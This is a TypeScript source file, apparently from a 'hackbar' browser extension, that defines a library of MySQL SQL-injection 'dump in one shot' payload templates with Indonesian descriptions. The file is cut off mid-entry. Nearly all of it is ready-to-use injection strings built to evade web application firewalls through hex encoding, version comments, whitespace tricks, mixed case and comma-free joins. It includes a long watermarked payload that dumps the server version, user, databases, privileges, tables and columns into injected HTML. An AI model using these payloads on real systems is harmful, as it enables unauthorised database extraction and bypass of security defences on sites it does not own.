/**
 * XEOO HACKBAR — Security Testing & HTTP Inspection Chrome Extension
 * 
 * @module WafBasedDiosMysql
 * @author Zone Xploiter / ZXMarchia
 * @license MIT
 * @description WAF-Evasion MySQL Dump In One Shot templates including comments and author watermarks.
 */

import { BuilderSubcategory, BuilderTemplate } from '../../types';

export const WAF_DIOS_MYSQL_GROUPS = [
  'WAF Evasion / Filter Bypass',
  'Version Comments (/*!50000...*)',
  'Inline Comments (/**/) & Space Substitutions',
  'No Commas & JOIN-Based WAF DIOS',
  'Classic WAF Signatures (Author / Popular Payloads)'
] as const;

export type WafDiosMysqlGroup = typeof WAF_DIOS_MYSQL_GROUPS[number];

// ============================================================================
// 1. WAF EVASION / FILTER BYPASS — 12 Templates
// ============================================================================
const wafEvasionDiosTemplates: BuilderTemplate[] = [
  {
    id: 'dios-mysql-waf-no-quotes',
    name: 'No Quotes (Unquoted 0xHex) DIOS',
    group: 'WAF Evasion / Filter Bypass',
    tags: ['waf-bypass', 'no-quotes', 'hex'],
    description: 'DIOS tanpa menggunakan tanda kutip tunggal/ganda (0xhex encoded strings)',
    content: "(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@x)AND(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'dios-mysql-waf-no-spaces-comments',
    name: 'No Space / Inline Comments (/**/) DIOS',
    group: 'WAF Evasion / Filter Bypass',
    tags: ['waf-bypass', 'no-spaces', 'comments'],
    description: 'Bypass filter spasi dengan substitusi komentar inline /**/ dan tanda plus',
    content: "(/*!50000SELECT*/(@x)/*!50000FROM*/(/*!50000SELECT*/(@x:=0x00),(/*!50000SELECT*/(0)/*!50000FROM*/(information_schema.columns)/*!50000WHERE*/(table_schema=database())AND(@x)AND(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'dios-mysql-waf-no-commas-join',
    name: 'No Commas (JOIN-Based) DIOS',
    group: 'WAF Evasion / Filter Bypass',
    tags: ['waf-bypass', 'no-commas', 'join'],
    description: 'DIOS yang dirancang menghindari koma menggunakan subquery JOIN',
    content: "(SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema=database()+LIMIT+0+OFFSET+0)"
  },
  {
    id: 'dios-mysql-waf-parentheses-only',
    name: 'Parentheses-Only (Zero Space) DIOS',
    group: 'WAF Evasion / Filter Bypass',
    tags: ['waf-bypass', 'no-space', 'parentheses'],
    description: 'Memisahkan seluruh keyword SQL hanya dengan tanda kurung buka dan tutup tanpa spasi',
    content: "(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@x)AND(@x:=CONCAT(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'dios-mysql-waf-backtick-schema',
    name: 'Backtick Identifier Obfuscated DIOS',
    group: 'WAF Evasion / Filter Bypass',
    tags: ['waf-bypass', 'backticks', 'identifier'],
    description: 'Membungkus semua identifier tabel dan skema dengan tanda petik balik (backticks)',
    content: "(SELECT(@b)FROM(SELECT(@b:=0x00),(SELECT(0)FROM(`information_schema`.`columns`)WHERE(`table_schema`=database())AND(@b)AND(@b:=concat(@b,0x0a,`table_name`,0x3a,`column_name`))))b)"
  },
  {
    id: 'dios-mysql-waf-mixed-case-flow',
    name: 'Mixed-Case (sElEcT / cOnCaT) DIOS',
    group: 'WAF Evasion / Filter Bypass',
    tags: ['waf-bypass', 'mixed-case', 'case-sensitive'],
    description: 'Bypass regex WAF berbasis case-sensitive dengan kombinasi huruf kapital dan kecil acak',
    content: "(sElEcT(@m)fRoM(sElEcT(@m:=0x00),(sElEcT(0)fRoM(iNfOrMaTiOn_sChEmA.cOlUmNs)wHeRe(tAbLe_sChEmA=dAtAbAsE())aNd(@m)aNd(@m:=cOnCaT(@m,0x0a,tAbLe_nAmE,0x3a,cOlUmN_nAmE))))m)"
  },
  {
    id: 'dios-mysql-waf-innodb-bypass',
    name: 'WAF InnoDB Non-Info Schema DIOS',
    group: 'WAF Evasion / Filter Bypass',
    tags: ['waf-bypass', 'innodb', 'non-info'],
    description: 'Bypass WAF yang memblokir kata kunci information_schema dengan memanfaatkan mysql.innodb_table_stats',
    content: "(SELECT(@i)FROM(SELECT(@i:=0x00),(SELECT(0)FROM(mysql.innodb_table_stats)WHERE(database_name=database())AND(@i)AND(@i:=concat(@i,0x0a,table_name))))i)"
  },
  {
    id: 'dios-mysql-waf-sys-auto-inc',
    name: 'WAF sys.schema_auto_increment DIOS',
    group: 'WAF Evasion / Filter Bypass',
    tags: ['waf-bypass', 'sys-schema', 'auto-inc'],
    description: 'Bypass kata kunci tabel skema dengan sys.schema_auto_increment_columns',
    content: "(SELECT(@s)FROM(SELECT(@s:=0x00),(SELECT(0)FROM(sys.schema_auto_increment_columns)WHERE(table_schema=database())AND(@s)AND(@s:=concat(@s,0x0a,table_name,0x3a,column_name))))s)"
  },
  {
    id: 'dios-mysql-waf-make-set-unquoted',
    name: 'WAF MAKE_SET Zero-Quote DIOS',
    group: 'WAF Evasion / Filter Bypass',
    tags: ['waf-bypass', 'make_set', 'no-concat'],
    description: 'Mengabaikan filter fungsi CONCAT dengan memanfaatkan fungsi MAKE_SET berpemisah 0x0a',
    content: "(SELECT(@m)FROM(SELECT(@m:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@m)AND(@m:=make_set(511,@m,0x0a,table_name,0x3a,column_name))))m)"
  },
  {
    id: 'dios-mysql-waf-export-set-unquoted',
    name: 'WAF EXPORT_SET Zero-Quote DIOS',
    group: 'WAF Evasion / Filter Bypass',
    tags: ['waf-bypass', 'export_set', 'no-concat'],
    description: 'Teknik alternatif tanpa CONCAT menggunakan EXPORT_SET() dan pemisah heksadesimal murni',
    content: "(SELECT(@e)FROM(SELECT(@e:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@e)AND(@e:=concat(@e,0x0a,export_set(5,table_name,column_name,0x3a,2)))))e)"
  },
  {
    id: 'dios-mysql-waf-concat-ws-unquoted',
    name: 'WAF CONCAT_WS Unquoted DIOS',
    group: 'WAF Evasion / Filter Bypass',
    tags: ['waf-bypass', 'concat_ws', 'unquoted'],
    description: 'Ekstraksi skema bertingkat concat_ws() tanpa tanda petik dengan separator heksadesimal murni',
    content: "(SELECT(@w)FROM(SELECT(@w:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@w)AND(@w:=concat_ws(0x0a,@w,concat_ws(0x3a,table_name,column_name)))))w)"
  },
  {
    id: 'dios-mysql-waf-char-delimiters',
    name: 'WAF CHAR(10,58) Integer Delimited DIOS',
    group: 'WAF Evasion / Filter Bypass',
    tags: ['waf-bypass', 'char-int', 'no-hex'],
    description: 'Mengganti konstanta 0x0a dan 0x3a dengan fungsi integer CHAR(10) dan CHAR(58)',
    content: "(SELECT(@c)FROM(SELECT(@c:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@c)AND(@c:=concat(@c,CHAR(10),table_name,CHAR(58),column_name))))c)"
  }
];

// ============================================================================
// 2. VERSION COMMENTS (/*!50000...*) — 12 Templates
// ============================================================================
const wafVersionCommentsDiosTemplates: BuilderTemplate[] = [
  {
    id: 'waf-dios-version-select-all',
    name: 'Full Version Comment (/*!50000...*/) DIOS',
    group: 'Version Comments (/*!50000...*)',
    tags: ['version-comment', '50000', 'select-all'],
    description: 'Membungkus seluruh keyword SQL dengan komentar versi MySQL /*!50000 ... */',
    content: "(/*!50000SELECT*/(@x)/*!50000FROM*/(/*!50000SELECT*/(@x:=0x00),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@x)/*!50000AND*/(@x:=/*!50000concat*/(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'waf-dios-version-concat-ws',
    name: 'Version Comment CONCAT_WS DIOS',
    group: 'Version Comments (/*!50000...*)',
    tags: ['version-comment', 'concat_ws', '50000'],
    description: 'Varian concat_ws() dengan pelindung komentar versi MySQL',
    content: "(/*!50000SELECT*/(@x)/*!50000FROM*/(/*!50000SELECT*/(@x:=0x00),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@x)/*!50000AND*/(@x:=/*!50000concat_ws*/(0x0a,@x,/*!50000concat_ws*/(0x3a,table_name,column_name)))))x)"
  },
  {
    id: 'waf-dios-version-info-schema',
    name: 'Obfuscated /*!50000information_schema*/ DIOS',
    group: 'Version Comments (/*!50000...*)',
    tags: ['version-comment', 'info-schema', 'identifier'],
    description: 'Membungkus nama skema secara spesifik untuk melewati filter regex WAF',
    content: "(SELECT(@a)FROM(SELECT(@a:=0x00),(SELECT(0)FROM(/*!50000information_schema.columns*/)WHERE(table_schema=database())AND(@a)AND(@a:=concat(@a,0x0a,table_name,0x3a,column_name))))a)"
  },
  {
    id: 'waf-dios-version-nested',
    name: 'Nested Version Comments /*!12345...*/ DIOS',
    group: 'Version Comments (/*!50000...*)',
    tags: ['version-comment', 'nested', 'advanced'],
    description: 'Komentar versi bertingkat untuk mengelabui token parser layer firewall',
    content: "(/*!50000SELECT*/(@v)/*!50000FROM*/(/*!50000SELECT*/(@v:=0x00),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(/*!50000table_schema*/=/*!50000database()*/)/*!50000AND*/(@v)/*!50000AND*/(@v:=/*!50000concat*/(@v,0x0a,table_name,0x3a,column_name))))v)"
  },
  {
    id: 'waf-dios-version-sys-schema',
    name: 'Version Comments + sys.schema DIOS',
    group: 'Version Comments (/*!50000...*)',
    tags: ['version-comment', 'sys-schema', 'bypass'],
    description: 'Kombinasi komentar versi dengan tabel sys.schema_auto_increment_columns',
    content: "(/*!50000SELECT*/(@s)/*!50000FROM*/(/*!50000SELECT*/(@s:=0x00),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000sys.schema_auto_increment_columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@s)/*!50000AND*/(@s:=concat(@s,0x0a,table_name,0x3a,column_name))))s)"
  },
  {
    id: 'waf-dios-version-innodb-stats',
    name: 'Version Comments + innodb_table_stats DIOS',
    group: 'Version Comments (/*!50000...*)',
    tags: ['version-comment', 'innodb', 'bypass'],
    description: 'Kombinasi komentar versi dengan tabel mysql.innodb_table_stats',
    content: "(/*!50000SELECT*/(@i)/*!50000FROM*/(/*!50000SELECT*/(@i:=0x00),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000mysql.innodb_table_stats*/)/*!50000WHERE*/(database_name=database())/*!50000AND*/(@i)/*!50000AND*/(@i:=concat(@i,0x0a,table_name))))i)"
  },
  {
    id: 'waf-dios-version-prefix-plus',
    name: 'Version Comments with Plus Prefixes (/*!50000+SELECT*/)',
    group: 'Version Comments (/*!50000...*)',
    tags: ['version-comment', 'plus-prefix', 'url-safe'],
    description: 'Komentar versi berawalan plus untuk melewati sanitasi query string web server',
    content: "(/*!50000+SELECT*/(@x)/*!50000+FROM*/(/*!50000+SELECT*/(@x:=0x00),(/*!50000+SELECT*/(0)/*!50000+FROM*/(information_schema.columns)/*!50000+WHERE*/(table_schema=database())AND(@x)AND(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'waf-dios-version-spaced-syntax',
    name: 'Spaced Version Delimiters (/*!50000 SELECT */)',
    group: 'Version Comments (/*!50000...*)',
    tags: ['version-comment', 'spaced', 'clean'],
    description: 'Format spasi di dalam komentar versi MySQL untuk stabilitas eksekusi',
    content: "(/*!50000 SELECT */(@s)/*!50000 FROM */(/*!50000 SELECT */(@s:=0x00),(/*!50000 SELECT */(0)/*!50000 FROM */(information_schema.columns)/*!50000 WHERE */(table_schema=database())AND(@s)AND(@s:=concat(@s,0x0a,table_name,0x3a,column_name))))s)"
  },
  {
    id: 'waf-dios-version-group-concat',
    name: 'Version Comment GROUP_CONCAT Subquery DIOS',
    group: 'Version Comments (/*!50000...*)',
    tags: ['version-comment', 'group_concat', 'clean'],
    description: 'Subquery bersih dengan seluruh fungsi agregasi dibungkus komentar versi',
    content: "(/*!50000SELECT*/ /*!50000group_concat*/(table_name,0x3a,column_name /*!50000SEPARATOR*/ 0x0a) /*!50000FROM*/ /*!50000information_schema.columns*/ /*!50000WHERE*/ table_schema=database())"
  },
  {
    id: 'waf-dios-version-all-db',
    name: 'Version Comment All-Databases Global DIOS',
    group: 'Version Comments (/*!50000...*)',
    tags: ['version-comment', 'all-db', 'global'],
    description: 'Dump seluruh database dan kolom di server terbungkus komentar versi',
    content: "(/*!50000SELECT*/(@g)/*!50000FROM*/(/*!50000SELECT*/(@g:=0x00),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(@g)/*!50000AND*/(@g:=concat(@g,0x0a,table_schema,0x2e,table_name,0x3a,column_name))))g)"
  },
  {
    id: 'waf-dios-version-make-set',
    name: 'Version Comment MAKE_SET DIOS',
    group: 'Version Comments (/*!50000...*)',
    tags: ['version-comment', 'make_set', 'no-concat'],
    description: 'Fungsi MAKE_SET() dilindungi komentar versi untuk bypass filter CONCAT',
    content: "(/*!50000SELECT*/(@m)/*!50000FROM*/(/*!50000SELECT*/(@m:=0x00),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@m)/*!50000AND*/(@m:=/*!50000make_set*/(511,@m,0x0a,table_name,0x3a,column_name))))m)"
  },
  {
    id: 'waf-dios-version-innodb-index',
    name: 'Version Comment innodb_index_stats DIOS',
    group: 'Version Comments (/*!50000...*)',
    tags: ['version-comment', 'innodb', 'index-stats'],
    description: 'Dump indeks dan skema via mysql.innodb_index_stats terbungkus komentar versi',
    content: "(/*!50000SELECT*/(@d)/*!50000FROM*/(/*!50000SELECT*/(@d:=0x00),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000mysql.innodb_index_stats*/)/*!50000WHERE*/(database_name=database())/*!50000AND*/(@d)/*!50000AND*/(@d:=concat(@d,0x0a,table_name,0x3a,index_name))))d)"
  },
  {
    id: 'waf-dios-enhanched',
    name: 'Last Version',
    group: 'Version Comments (/*!50000...*)',
    tags: ['version-comment', 'innodb', 'index-stats'],
    description: 'Powerfull Dump',
    content: "/*!50000concat*//**ZxMarchia**/(0x223e273e3c2f7469746c653e,0x3c6c696e6b2072656c3d227374796c6573686565742220687265663d2268747470733a2f2f646576656c6f706d656e742e67756172646972616e2e6f72672f7075626c69632f6f6666696369616c2d6465666163652d706167652f646570656e64656e636965732f6373732f726f6f742e6373732220747970653d22746578742f637373223e3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2232223e3c74686561643e3c74723e3c746820636f6c7370616e3d2232223e3c6469762069643d2267756172646972616e2d6c6f676f223e3c696d6720647261676761626c653d2266616c736522207372633d2268747470733a2f2f692e6962622e636f2f643448586d4b542f696d616765732d352e6a7067222077696474683d323030206865696768743d32303020616c743d225a6f6e6558706c6f69746572223e3c2f6469763e3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e3c683320616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d22677265656e223e494e4a4543544544204279202d3a203c666f6e7420636f6c6f723d22726564223e204e6f747442656c6c2021213c2f68333e3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d226c656674223e3c666f6e7420636f6c6f723d626c75653e56657273696f6e203d3d3d3d3e203c666f6e7420636f6c6f723d7265643e,/*!50000VerSiOn*//**ZxMarchia**/(),0x3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d226c656674223e3c666f6e7420636f6c6f723d626c75653e55736572203d3d3e203c666f6e7420636f6c6f723d7265643e,/*!50000UsEr*//**ZxMarchia**/(),0x3c2f74683e3c2f74723e,0x3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d226c656674223e3c666f6e7420636f6c6f723d626c75653e4461746162617365203d3d3d3e203c66f6e7420636f6c6f723d7265643e,/*!50000DaTabaSe*//**ZxMarchia**/(),0x3c2f74683e3c2f74723e,0x3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d7265643e546f74616c2044617461626173653c2f74723e3c2f74683e3c74723e3c746820636f6c7370616e3d2232223e,(SeLECT(@w)/*!50000FrOM*//**ZxMarchia**/(/*!50000SeLECT*//**ZxMarchia**/(@w:=0x00)%20,(SeLECT(@w)/*!50000FrOM*//**ZxMarchia**/(/*!50000InFOrMATIoN_SChEmA*//**ZxMarchia**/.SCheMaTA)/*!50000WhErE*//**ZxMarchia**/(@w)IN(@w:=/*!50000CoNCaT*//**ZxMarchia**/(0x20,@w,0x3c64697620616c69676e3d226c656674223e3c666f6e7420636f6c6f723d626c75653e,/*!50000sCheMa_NaMe*//**ZxMarchia**/,0x3c62723e))))w),0x3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d7265643e557365722050726976696c6567653c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e,(SeLECT(@z)/*!50000FrOM*//**ZxMarchia**/(/*!50000SeLECT*//**ZxMarchia**/(@z:=0x00)%20,(SeLECT(@z)/*!50000FrOM*//**ZxMarchia**/(/*!50000INFOrmATiON_SChEmA*//**ZxMarchia**/.UsER_PRIViLEgES)/*!50000WhERE*//**ZxMarchia**/(@z)IN(@z:=/*!50000CoNCaT*//**ZxMarchia**/(0x20,@z,0x3c64697620616c69676e3d226c656674223e3c666f6e7420636f6c6f723d626c75653e,GrANtEE,0x202d3e20,Is_gRANTaBLE,0x3c62723e))))z),0x3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d2263656e746572223e3c696d6720647261676761626c653d2266616c736522207372633d2268747470733a2f2f63616d6f2e67697468756275736572636f6e74656e742e636f6d2f396139623135626464356664613538636464623237313365633130336131333633623966653264643039323431343538356464303538623465663835356630622f36383734373437303733336132663266363332653734363536653666373232653633366636643266363235303331343433343532363235613539373535313431343134313431343332663665363936653661363132643637363136393634363536653265363736393636222077696474683d323630206865696768743d31303020616c743d225a6f6e6558706c6f69746572223e3c2f74683e3c2f74723e3c74723e3c74683e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d6379616e3e4e616d65204f66205461626c653c2f74683e3c74683e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d6379616e3e4e616d65204f6620436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(selEct(@x)/*!50000fRom*//**ZxMarchia**/(/*!50000sElect*//**ZxMarchia**/(@x:=0x00),(sElect(0)/*!From*//**ZxMarchia**/(/*!50000inforMation_schEma.coLuMns*//**ZxMarchia**/)/*!50000Where*//**ZxMarchia**/(taBle_schema=/*!50000DatAbase*//**ZxMarchia**/())and(0x00)in(@x:=/*!50000coNcat*//**ZxMarchia**/(@x,0x3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e,0x3c64697620616c69676e3d226c656674223e,/*!50000tAble_naMe*//**ZxMarchia**/,0x3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e,0x3c64697620616c69676e3d226c656674223e,/*!50000colUmn_naMe*//**ZxMarchia**/,0x3c2f666f6e743e3c2f74643e3c2f74723e))))x))"
  }

];

// ============================================================================
// 3. INLINE COMMENTS (/**/) & SPACE SUBSTITUTIONS — 12 Templates
// ============================================================================
const wafInlineCommentsDiosTemplates: BuilderTemplate[] = [
  {
    id: 'waf-dios-inline-comment-std',
    name: 'Standard Inline Comment (/**/) DIOS',
    group: 'Inline Comments (/**/) & Space Substitutions',
    tags: ['inline-comments', 'slash-star', 'no-spaces'],
    description: 'Menggantikan seluruh spasi antar keyword dengan blok komentar kosong /**/',
    content: "(SELECT/**/(@x)/**/FROM/**/(SELECT/**/(@x:=0x00),(SELECT/**/(0)/**/FROM/**/(information_schema.columns)/**/WHERE/**/(table_schema=database())/**/AND/**/(@x)/**/AND/**/(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'waf-dios-newline-tab-sub',
    name: 'Line Feed (%0a) & Tab (%09) DIOS',
    group: 'Inline Comments (/**/) & Space Substitutions',
    tags: ['whitespace-bypass', 'newline', 'tab'],
    description: 'Substitusi spasi menggunakan karakter newline (0x0a) dan tab (0x09)',
    content: "(SELECT\n(@x)\nFROM\n(SELECT\n(@x:=0x00),(SELECT\n(0)\nFROM\n(information_schema.columns)\nWHERE\n(table_schema=database())\nAND\n(@x)\nAND\n(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'waf-dios-inline-formfeed',
    name: 'Form Feed (%0c) Delimited DIOS',
    group: 'Inline Comments (/**/) & Space Substitutions',
    tags: ['whitespace-bypass', 'formfeed', '0x0c'],
    description: 'Substitusi whitespace menggunakan URL encoded Form Feed %0c',
    content: "(SELECT%0c(@x)%0cFROM%0c(SELECT%0c(@x:=0x00),(SELECT%0c(0)%0cFROM%0c(information_schema.columns)%0cWHERE%0c(table_schema=database())%0cAND%0c(@x)%0cAND%0c(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'waf-dios-inline-cr-lf',
    name: 'Carriage Return (%0d) Delimited DIOS',
    group: 'Inline Comments (/**/) & Space Substitutions',
    tags: ['whitespace-bypass', 'crlf', '0x0d'],
    description: 'Substitusi spasi menggunakan carriage return (%0d) per token SQL',
    content: "(SELECT%0d(@x)%0dFROM%0d(SELECT%0d(@x:=0x00),(SELECT%0d(0)%0dFROM%0d(information_schema.columns)%0dWHERE%0d(table_schema=database())%0dAND%0d(@x)%0dAND%0d(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'waf-dios-inline-comment-exclamation',
    name: 'Exclamation Comment (/*!*/) Delimited DIOS',
    group: 'Inline Comments (/**/) & Space Substitutions',
    tags: ['inline-comments', 'exclamation', 'no-spaces'],
    description: 'Substitusi spasi menggunakan komentar tanda seru kosong /*!*/',
    content: "(SELECT/*!*/(@x)/*!*/FROM/*!*/(SELECT/*!*/(@x:=0x00),(SELECT/*!*/(0)/*!*/FROM/*!*/(information_schema.columns)/*!*/WHERE/*!*/(table_schema=database())/*!*/AND/*!*/(@x)/*!*/AND/*!*/(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'waf-dios-inline-null-byte-prefixed',
    name: 'Null Byte (%00) Prefix Inline DIOS',
    group: 'Inline Comments (/**/) & Space Substitutions',
    tags: ['inline-comments', 'null-byte', 'advanced'],
    description: 'Komentar inline dikombinasikan dengan null byte /*!%00SELECT*/',
    content: "(/*!%00SELECT*/(@x)/*!%00FROM*/(/*!%00SELECT*/(@x:=0x00),(/*!%00SELECT*/(0)/*!%00FROM*/(information_schema.columns)/*!%00WHERE*/(table_schema=database())AND(@x)AND(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'waf-dios-inline-concat-ws-comments',
    name: 'Inline Comment CONCAT_WS DIOS',
    group: 'Inline Comments (/**/) & Space Substitutions',
    tags: ['inline-comments', 'concat_ws', 'comments'],
    description: 'Fungsi concat_ws() berpemisah komentar inline /**/ tanpa satu pun spasi',
    content: "(SELECT/**/(@x)/**/FROM/**/(SELECT/**/(@x:=0x00),(SELECT/**/(0)/**/FROM/**/(information_schema.columns)/**/WHERE/**/(table_schema=database())/**/AND/**/(@x)/**/AND/**/(@x:=concat_ws(0x0a,@x,concat_ws(0x3a,table_name,column_name)))))x)"
  },
  {
    id: 'waf-dios-inline-multi-line-block',
    name: 'Multi-Line Wrapped Comments DIOS',
    group: 'Inline Comments (/**/) & Space Substitutions',
    tags: ['inline-comments', 'multi-line', 'evasion'],
    description: 'Komentar multi-baris acak untuk mengacaukan analisis state machine WAF',
    content: "(SELECT/*\n*\/(@x)/*\n*\/FROM/*\n*\/(SELECT/*\n*\/(@x:=0x00),(SELECT/*\n*\/(0)/*\n*\/FROM/*\n*\/(information_schema.columns)/*\n*\/WHERE/*\n*\/(table_schema=database())/*\n*\/AND/*\n*\/(@x)/*\n*\/AND/*\n*\/(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'waf-dios-inline-vertical-tab',
    name: 'Vertical Tab (%0b) Delimited DIOS',
    group: 'Inline Comments (/**/) & Space Substitutions',
    tags: ['whitespace-bypass', 'vertical-tab', '0x0b'],
    description: 'Substitusi whitespace dengan karakter vertical tab (%0b) standar POSIX',
    content: "(SELECT%0b(@x)%0bFROM%0b(SELECT%0b(@x:=0x00),(SELECT%0b(0)%0bFROM%0b(information_schema.columns)%0bWHERE%0b(table_schema=database())%0bAND%0b(@x)%0bAND%0b(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'waf-dios-inline-mixed-delimiters',
    name: 'Mixed Whitespace & Comments DIOS',
    group: 'Inline Comments (/**/) & Space Substitutions',
    tags: ['whitespace-bypass', 'mixed-delimiters', 'waf-killer'],
    description: 'Kombinasi acak /**/, %0a, %09, dan tanda kurung buka-tutup',
    content: "(SELECT/**/(@x)%0aFROM/**/(SELECT%09(@x:=0x00),(SELECT/**/(0)%0aFROM/**/(information_schema.columns)/**/WHERE/**/(table_schema=database())%0aAND/**/(@x)%0aAND/**/(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'waf-dios-inline-plus-dash-comment',
    name: 'Plus-Dash Hybrid Comments (/*!--+*/) DIOS',
    group: 'Inline Comments (/**/) & Space Substitutions',
    tags: ['inline-comments', 'plus-dash', 'hybrid'],
    description: 'Format hibrida /*!--+/*%00*/ untuk bypass Cloudflare dan ModSecurity',
    content: "(/*!--+*//*!50000SELECT*//**/(@x)/**/FROM/**/(/*!--+*//*!50000SELECT*//**/(@x:=0x00),(/*!--+*//*!50000SELECT*//**/(0)/**/FROM/**/(information_schema.columns)/**/WHERE/**/(table_schema=database())/**/AND/**/(@x)/**/AND/**/(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'waf-dios-inline-double-comment-space',
    name: 'Double Inline Comment (/**//**/) DIOS',
    group: 'Inline Comments (/**/) & Space Substitutions',
    tags: ['inline-comments', 'double-comment', 'token-splitter'],
    description: 'Memecah token query ganda dengan komentar berdampingan /**//**/',
    content: "(SELECT/**//**/(@x)/**//**/FROM/**//**/(SELECT/**//**/(@x:=0x00),(SELECT/**//**/(0)/**//**/FROM/**//**/(information_schema.columns)/**//**/WHERE/**//**/(table_schema=database())/**//**/AND/**//**/(@x)/**//**/AND/**//**/(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  }
];

// ============================================================================
// 4. NO COMMAS & JOIN-BASED WAF DIOS — 12 Templates
// ============================================================================
const wafNoCommasJoinDiosTemplates: BuilderTemplate[] = [
  {
    id: 'waf-dios-no-comma-join-alias',
    name: 'No Commas (JOIN Alias) DIOS',
    group: 'No Commas & JOIN-Based WAF DIOS',
    tags: ['no-commas', 'join', 'subquery-alias'],
    description: 'Menghindari tanda koma dalam klausa FROM menggunakan JOIN dan alias subquery',
    content: "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0)"
  },
  {
    id: 'waf-dios-no-comma-natural-join',
    name: 'No Commas (NATURAL JOIN) DIOS',
    group: 'No Commas & JOIN-Based WAF DIOS',
    tags: ['no-commas', 'natural-join', 'no-on'],
    description: 'Menggabungkan tabel tanpa koma atau klausa ON menggunakan NATURAL JOIN',
    content: "(SELECT table_name FROM (SELECT * FROM information_schema.tables WHERE table_schema=database()) AS a NATURAL JOIN (SELECT table_name FROM information_schema.columns) AS b LIMIT 1)"
  },
  {
    id: 'waf-dios-no-comma-cross-join',
    name: 'No Commas (CROSS JOIN) DIOS',
    group: 'No Commas & JOIN-Based WAF DIOS',
    tags: ['no-commas', 'cross-join', 'join'],
    description: 'Menghindari koma dengan CROSS JOIN tabel schema',
    content: "(SELECT table_name FROM information_schema.tables CROSS JOIN information_schema.columns WHERE tables.table_name=columns.table_name AND tables.table_schema=database() LIMIT 1)"
  },
  {
    id: 'waf-dios-no-comma-case-when',
    name: 'No Commas (CASE WHEN) DIOS',
    group: 'No Commas & JOIN-Based WAF DIOS',
    tags: ['no-commas', 'case-when', 'conditional'],
    description: 'Struktur kondisional CASE WHEN tanpa menggunakan koma',
    content: "(SELECT CASE WHEN (SELECT count(table_name) FROM information_schema.tables WHERE table_schema=database())>0 THEN (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1) ELSE 0 END)"
  },
  {
    id: 'waf-dios-no-comma-like-offset',
    name: 'No Commas (LIKE & OFFSET) DIOS',
    group: 'No Commas & JOIN-Based WAF DIOS',
    tags: ['no-commas', 'offset', 'like'],
    description: 'Ekstraksi nama tabel bertahap dengan LIMIT 1 OFFSET 0 tanpa koma',
    content: "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE 0x25 LIMIT 1 OFFSET 0)"
  },
  {
    id: 'waf-dios-no-comma-union-select',
    name: 'No Commas (UNION-Chained) DIOS',
    group: 'No Commas & JOIN-Based WAF DIOS',
    tags: ['no-commas', 'union-chain', 'single-col'],
    description: 'Chaining hasil ekstraksi kolom tunggal tanpa menggunakan koma',
